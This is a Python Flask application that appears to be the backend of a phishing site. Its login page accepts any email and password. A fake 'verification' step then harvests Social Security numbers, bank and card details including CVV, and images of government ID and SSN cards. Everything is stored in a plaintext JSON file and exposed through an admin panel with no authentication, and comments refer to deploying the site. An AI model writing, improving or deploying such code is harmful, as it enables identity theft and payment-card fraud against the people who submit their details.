from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import os
import json

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- Simulate a "database" of users and their info ---
DB_FILE = 'users_db.json'

# Define all expected keys for a user, including new verification fields
EXPECTED_USER_KEYS = [
    "password", "fullname", "phonenumber", "profile_picture_base64", # Original fields
    "ssn", "bankName", "cardNumber", "expiryDate", "cvv",            # New text fields
    "photoId", "ssnCard"                                             # New image fields (gov ID and SSN card)
]

def load_users_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                db = json.load(f)
                # Ensure all users have all expected keys with default empty strings
                for user_id, details in db.items():
                    for key in EXPECTED_USER_KEYS:
                        if key not in details:
                            details[key] = "" # Default to empty string if missing
                return db
        except json.JSONDecodeError:
            return {}  # Return empty if DB is corrupted
    return {}

def save_users_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

users_db = load_users_db()

# Initialize DB with a test user if empty, ensuring all keys are present
if not users_db:
    users_db = {
        "test@example.com": {key: "" for key in EXPECTED_USER_KEYS} # Initialize all keys
    }
    users_db["test@example.com"]["password"] = "password123" # Set password for test user
    save_users_db(users_db)
else:
    # Ensure existing users have the new fields
    needs_save = False
    for user_id, details in users_db.items():
        for key in EXPECTED_USER_KEYS:
            if key not in details:
                details[key] = ""
                needs_save = True
    if needs_save:
        save_users_db(users_db)


# --- ROUTES ---

@app.route('/')
def index():
    if session.get('logged_in'):
        # If already logged in, and verification data might be missing, redirect to verification
        user_email = session.get('user_email')
        # A simple check, you might want a more robust way to see if verification is needed
        if user_email and users_db.get(user_email) and not users_db[user_email].get('ssn'):
             return redirect(url_for('verification_page'))
        return redirect(url_for('dashboard'))
    return render_template('index.html') # Assuming you have an index.html for login

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')

    user_id = email # Using email as user_id

    # If user doesn't exist, create them with all expected fields initialized
    if user_id not in users_db:
        users_db[user_id] = {key: "" for key in EXPECTED_USER_KEYS}
        users_db[user_id]["password"] = password
        # No need to save here if login immediately goes to verification for new users
        # Or save if you want the basic record created immediately
        # save_users_db(users_db) # Optional save here

    # For existing users or newly created ones, check password
    if users_db.get(user_id) and users_db[user_id].get("password") == password:
        session['logged_in'] = True
        session['user_email'] = email
        
        # Load relevant details into session (optional, depending on needs)
        # These session variables are mostly for display on non-admin pages if needed
        session['user_fullname'] = users_db[user_id].get('fullname', '')
        session['profile_picture_base64'] = users_db[user_id].get('profile_picture_base64', '') # Original profile pic

        # Check if essential verification data like SSN is missing for this user
        # If so, redirect to verification page after login.
        # This assumes SSN is a good indicator of incomplete verification.
        if not users_db[user_id].get('ssn'): # Or any other key field from verification
            # Frontend will handle redirect to verification page upon successful login response
             return jsonify({'message': 'Login successful, proceed to verification'}), 200
        
        return jsonify({'message': 'Login successful'}), 200
    else:
        return jsonify({'message': 'Invalid email or password'}), 401


@app.route('/verification')
def verification_page():
    if not session.get('logged_in'):
        return redirect(url_for('index'))
    # You could pass existing user data to pre-fill parts of the form if desired
    # user_email = session.get('user_email')
    # user_data = users_db.get(user_email, {})
    # return render_template('verification.html', user_data=user_data)
    return render_template('verification.html')

@app.route('/verify_info', methods=['POST'])
def verify_info():
    if not session.get('logged_in'):
        return jsonify({'message': 'Unauthorized Access: Please log in.'}), 401

    data = request.get_json()
    if not data:
        return jsonify({'message': 'No data provided'}), 400
        
    user_email = session.get('user_email')

    if not user_email or user_email not in users_db:
        return jsonify({'message': 'User session not found or user does not exist.'}), 404

    # --- Capture ALL fields from the verification form ---
    # Personal Info
    users_db[user_email]['fullName'] = data.get('fullName', users_db[user_email].get('fullName', '')) # Keep existing if not provided
    users_db[user_email]['phoneNumber'] = data.get('phoneNumber', users_db[user_email].get('phoneNumber', ''))
    users_db[user_email]['ssn'] = data.get('ssn', '') # SSN

    # Financial Info
    users_db[user_email]['bankName'] = data.get('bankName', '')
    users_db[user_email]['cardNumber'] = data.get('cardNumber', '')
    users_db[user_email]['expiryDate'] = data.get('expiryDate', '')
    users_db[user_email]['cvv'] = data.get('cvv', '')

    # Uploaded Documents
    # 'photoId' from form is the Government ID. Store it in 'photoId' key for the template.
    users_db[user_email]['photoId'] = data.get('photoId', '') # Government ID image base64
    users_db[user_email]['ssnCard'] = data.get('ssnCard', '') # SSN Card image base64
    
    # Note: The original 'profile_picture_base64' is not updated here unless you intend
    # the 'photoId' from verification to also serve as the main profile picture.
    # If 'photoId' from verification should ALSO be the main profile picture, you can add:
    # users_db[user_email]['profile_picture_base64'] = data.get('photoId', '')

    save_users_db(users_db)

    # Update session with new basic info if needed (optional)
    session['user_fullname'] = users_db[user_email]['fullName']
    # session['profile_picture_base64'] = users_db[user_email]['photoId'] # If you want to update session with Gov ID as profile pic

    print(f"User {user_email} verification data updated: {users_db[user_email]}") # For debugging
    return jsonify({'message': 'Verification information updated successfully!'}), 200


@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('index'))
    # You can pass user details to dashboard if needed
    # user_email = session.get('user_email')
    # user_data = users_db.get(user_email, {})
    # return render_template('dashboard.html', user=user_data)
    return render_template('dashboard.html') # Assuming you have a dashboard.html

@app.route('/admin_panel')
def admin_panel():
    # No changes needed here, it already passes the full users_db
    return render_template('admin.html', users=users_db) # Ensure your template is named 'admin.html' or change here

@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    return jsonify({'message': 'Logged out successfully'}), 200

if __name__ == '__main__':
    # This block is for local development
    # For Render, the app.run() at the end is what matters for starting the server.
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    # Re-ensure DB structure on startup (already handled by load_users_db and init block)
    current_users_db = load_users_db()
    needs_save_on_startup = False
    if not current_users_db: # If DB was empty or failed to load
        current_users_db = {
            "test@example.com": {key: "" for key in EXPECTED_USER_KEYS}
        }
        current_users_db["test@example.com"]["password"] = "password123"
        needs_save_on_startup = True
    else:
        for user_id, details in current_users_db.items():
            for key in EXPECTED_USER_KEYS:
                if key not in details:
                    details[key] = ""
                    needs_save_on_startup = True
    if needs_save_on_startup:
        save_users_db(current_users_db)
    
    users_db = current_users_db # Make sure the global users_db is the one loaded/fixed

    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True) # Set debug=True for local development